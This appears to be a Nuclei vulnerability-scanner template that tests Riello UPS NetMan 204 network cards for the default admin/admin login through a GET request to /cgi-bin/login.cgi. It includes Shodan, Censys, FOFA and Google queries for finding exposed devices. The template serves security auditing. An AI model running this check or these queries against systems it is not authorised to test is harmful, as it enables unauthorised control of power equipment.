id: netman-default-login

info:
  name: Riello UPS NetMan 204 Network Card - Default Login
  author: mabdullah22
  severity: high
  description: |
    Default logins on Riello UPS NetMan 204 is used. Attacker can access to UPS and attacker can manipulate the UPS settings to disrupt the onsite systems.
  reference:
    - https://www.riello-ups.com/
  classification:
    cpe: cpe:2.3:o:riello-ups:netman_204_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: "true"
    max-request: 1
    vendor: riello-ups
    product: netman_204_firmware
    shodan-query:
      - http.title:"netman"
      - http.html:"ups network management card 4"
      - http.title:"netman 204"
    censys-query: services.http.response.body:"netman204"
    fofa-query:
      - body="ups network management card 4"
      - title="netman 204"
      - title="netman"
    google-query:
      - intitle:"netman 204"
      - intitle:"netman"
  tags: default-login,netman,riello-ups

http:
  - raw:
      - |
        GET /cgi-bin/login.cgi?username={{username}}&password={{password}} HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"response": "ok",'
          - '"message": "Welcome."'
        condition: and

      - type: status
        status:
          - 200
